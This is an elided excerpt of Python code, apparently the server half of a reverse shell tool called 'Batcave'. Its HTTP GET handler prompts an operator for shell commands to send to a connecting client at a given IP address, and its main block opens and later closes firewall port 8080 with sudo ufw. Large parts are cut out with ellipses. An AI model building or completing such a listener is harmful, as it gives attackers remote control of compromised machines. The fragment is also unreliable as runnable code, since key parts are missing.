...
class MyHandler(http.server.BaseHTTPRequestHandler):
	def do_GET(self):
		command = input(Fore.YELLOW+f"Shell@{self.client_address[0]}>> "+Fore.LIGHTBLACK_EX)
...
if __name__=="__main__":
	...
	os.system('sudo ufw allow to any port 8080')
	print(Fore.LIGHTBLACK_EX+f"[!] Batcave listening on port {host_port}....")
...
os.system('sudo ufw delete allow to any port 8080')
print(Fore.RESET+"")
